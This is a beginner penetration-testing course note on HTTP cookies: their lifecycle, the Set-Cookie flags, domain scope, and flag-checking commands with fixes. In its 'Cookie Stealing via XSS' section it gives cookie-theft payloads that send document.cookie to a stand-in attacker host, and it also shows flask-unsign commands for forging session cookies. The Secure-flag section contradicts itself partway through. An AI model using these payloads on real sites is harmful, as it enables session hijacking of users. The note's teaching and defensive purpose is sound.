---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.11 Cookies — Structure, Flags, Lifecycle"
---

# 02.11 — Cookies — Structure, Flags, Lifecycle

## What is it?

**Cookies** are small pieces of data that a server stores in the client's browser via the `Set-Cookie` response header. The browser automatically sends them back with every subsequent request to that domain via the `Cookie` request header. Cookies solve HTTP's stateless problem — they're how servers remember who you are.

---

## Cookie Lifecycle

```
STEP 1: Server sets cookie in response
  HTTP/1.1 200 OK
  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

STEP 2: Browser stores cookie
  Browser cookie jar:
  ┌──────────────────────────────────────────────────────┐
  │  Domain: target.com                                  │
  │  Name: session                                       │
  │  Value: abc123                                       │
  │  Path: /                                             │
  │  Expires: [timestamp] or Session                     │
  │  Secure: true                                        │
  │  HttpOnly: true                                      │
  │  SameSite: Lax                                       │
  └──────────────────────────────────────────────────────┘

STEP 3: Browser sends cookie with every request
  GET /dashboard HTTP/1.1
  Host: target.com
  Cookie: session=abc123; theme=dark; lang=en

STEP 4: Cookie expires or is deleted
  Max-Age=0 or Expires=past date → deleted
  Session cookie (no Max-Age/Expires) → deleted when browser closes
```

---

## Set-Cookie Flags — Every Flag Matters

```
Set-Cookie: session=abc123; Domain=target.com; Path=/; Max-Age=3600; Secure; HttpOnly; SameSite=Lax

FLAG            VALUE         SECURITY MEANING
──────────────────────────────────────────────────────────────────
Name=Value      session=abc   The cookie name and its value
Domain          target.com    Which domain gets this cookie
Path            /             URL path scope for the cookie
Max-Age         3600          Seconds until expiry (preferred over Expires)
Expires         datetime      Absolute expiry date/time
Secure          (flag)        Only send over HTTPS connections
HttpOnly        (flag)        Not accessible via JavaScript (document.cookie)
SameSite        Strict/Lax/None  Controls cross-site sending behavior
```

---

## HttpOnly Flag

```
WITHOUT HttpOnly:
  document.cookie   → returns "session=abc123"
  XSS script can steal: fetch('https://attacker.com/?c=' + document.cookie)

WITH HttpOnly:
  document.cookie   → returns "" (cookies with HttpOnly are hidden from JS)
  XSS cannot directly steal the cookie via JavaScript

ATTACK ON HttpOnly:
  ✗ document.cookie — blocked
  ✓ XSS can still: send requests using the cookie (same-origin)
  ✓ CSRF using the cookie (cookie still sent by browser)
  ✓ TRACE method echo (XST — if TRACE enabled)
  ✓ Network interception if not Secure
  ✓ Subdomain cookie access (if Domain set to .target.com)

CHECK:
  curl -sI https://target.com | grep -i set-cookie | grep -iv httponly
  ← Cookies without HttpOnly flag
```

---

## Secure Flag

```
WITHOUT Secure:
  Cookie sent over both HTTP and HTTPS
  MITM on HTTP → cookie captured!
  Even if login is HTTPS, if any page is HTTP → cookie exposed

WITH Secure:
  Browser only sends cookie over HTTPS connections
  HTTP requests don't include this cookie

ATTACK:
  Even with Secure, if site has any HTTP endpoint:
  HTTP Strict Transport Security (HSTS) prevents this
  Without HSTS: attacker can inject page that loads HTTP resource
  Browser makes HTTP request → Secure cookie still sent (if HSTS missing)!

Wait — Secure flag IS checked:
  Actually with Secure flag → NOT sent over HTTP regardless of HSTS
  Combined with Secure + HSTS: maximum protection
```

---

## SameSite Flag

```
Controls when cookies are sent with cross-site requests.
KEY for CSRF protection!

SameSite=Strict:
  Cookie ONLY sent when navigating within same site.
  Clicking a link from gmail.com to target.com → NO cookie sent!
  Most secure. Breaks some legitimate cross-site flows.

SameSite=Lax (DEFAULT if not set in modern browsers):
  Cookie sent for top-level navigations (clicking links).
  NOT sent for cross-site subrequests (img, iframe, AJAX).
  Protects against most CSRF while allowing navigation.
  Clicking link from external site → cookie IS sent.
  <img src="target.com/action"> → cookie NOT sent.

SameSite=None:
  Cookie sent for all cross-site requests (old behavior).
  REQUIRES Secure flag too (browsers enforce this).
  Only use when you genuinely need cross-site cookies (OAuth flows, embedded content).
  SameSite=None without Secure → browser ignores/rejects.

CSRF IMPLICATIONS:
  Strict: CSRF impossible ✓
  Lax: CSRF with GET possible via link click (but most CSRF uses POST) ✓
  None: CSRF possible via any cross-site request ✗

Check:
  curl -sI https://target.com | grep -i samesite
  ← None = CSRF risk
  ← Missing = depends on browser default (usually Lax now)
```

---

## Domain and Path Scope

```
Domain=target.com:
  Cookie sent to target.com only (NOT subdomains)

Domain=.target.com (leading dot):
  Cookie sent to target.com AND all subdomains:
  api.target.com, admin.target.com, etc.

ATTACK:
  If cookie Domain=.target.com:
  Compromise any subdomain (e.g., XSS on blog.target.com)
  XSS can access and steal cookies shared with all subdomains!
  Even sub.target.com can SET cookies for .target.com that get sent to www.target.com

Path=/api:
  Cookie only sent to /api/* paths
  Provides some compartmentalization but not a security boundary

COOKIE TOSSING ATTACK:
  If attacker controls a subdomain (e.g., via subdomain takeover):
  Subdomain sets a cookie: session=attacker_controlled
  With Domain=.target.com this cookie gets sent to target.com!
  Overwrites real session → session fixation!
```

---

## Cookie Attributes — Security Analysis

```
IDEAL SECURE COOKIE:
  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=1800; Domain=target.com

VULNERABLE COOKIES AND WHAT ATTACKS THEY ENABLE:

session=abc123
  (no flags at all)
  ✗ No HttpOnly → XSS steals cookie
  ✗ No Secure → sent over HTTP → captured in transit
  ✗ No SameSite → CSRF possible
  ✗ No expiry → session never expires

session=abc123; HttpOnly; Secure
  ✓ HttpOnly → XSS can't steal
  ✓ Secure → only over HTTPS
  ✗ No SameSite → CSRF still possible
```

---

## Security Context — Cookies in VAPT

### 1. Session Fixation

```
ATTACK: Force victim to use attacker's known session ID
1. Attacker visits target.com → gets session=ATTACKER_SESSION
2. Attacker tricks victim: https://target.com/login?session=ATTACKER_SESSION
   (if app sets session from URL param)
   or via XSS: document.cookie = "session=ATTACKER_SESSION"
3. Victim logs in with ATTACKER_SESSION
4. Server promotes ATTACKER_SESSION to authenticated
5. Attacker uses ATTACKER_SESSION → logged in as victim!

FIX: Generate NEW session ID on login (don't reuse pre-auth session)
```

### 2. Cookie Tampering — Predictable Values

```bash
# Decode and analyze cookie values
echo "session=YWRtaW46MTIzNA==" | cut -d= -f2 | base64 -d
# → admin:1234  ← base64 encoded user info! Modify and re-encode!

# Flask session cookie (signed JWT-like):
flask-unsign --decode --cookie "eyJ1c2VyIjoiYWxpY2UifQ.Zn..."
flask-unsign --sign --cookie "{'user': 'admin'}" --secret "weak_secret"

# JWT in cookie (see Module JWT):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UifQ.sig
```

### 3. Cookie Stealing via XSS

```javascript
// When XSS fires (non-HttpOnly cookies):
<script>
fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

// Or via image tag:
<img src="https://attacker.com/steal?c=" onerror="this.src+document.cookie">

// More reliable — XMLHttpRequest:
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/?c=' + encodeURIComponent(document.cookie));
xhr.send();
</script>
```

### 4. Analyzing All Cookies in Burp

```
In Burp Suite:
  Proxy → HTTP history → any request → Cookie header
  
  Right-click a cookie value → Send to Decoder
  Decoder: Decode Base64, URL, HTML — see raw value
  
  Inspector panel: shows all cookies parsed
  
  Scanner: Check cookie flags automatically
  Active scan: tests for session fixation, cookie tampering

Command line:
curl -c cookies.txt https://target.com -o /dev/null
cat cookies.txt

# Check for missing security flags:
curl -sI https://target.com | grep -i set-cookie | while read line; do
  echo "$line"
  echo "$line" | grep -qi httponly || echo "  ← MISSING HttpOnly"
  echo "$line" | grep -qi secure || echo "  ← MISSING Secure"
  echo "$line" | grep -qi samesite || echo "  ← MISSING SameSite"
done
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| No HttpOnly flag | Add HttpOnly to all session/auth cookies |
| No Secure flag | Add Secure, enforce HTTPS everywhere |
| No SameSite | Add SameSite=Lax (minimum) or Strict |
| Session fixation | Generate new session ID on login |
| Predictable session values | Use cryptographically random session IDs (128+ bits) |
| Long-lived sessions | Set reasonable Max-Age, implement idle timeout |
| Cookie domain too broad (.target.com) | Use specific domain when possible |

---

## Related Notes
- [[12 - Sessions How Server-Side Sessions Work]] — server-side session management
- [[Module 07 - CSRF]] — SameSite is the primary CSRF defense
- [[Module 02 - XSS]] — XSS to steal cookies
- [[Module 05 - Session Management]] — full session security
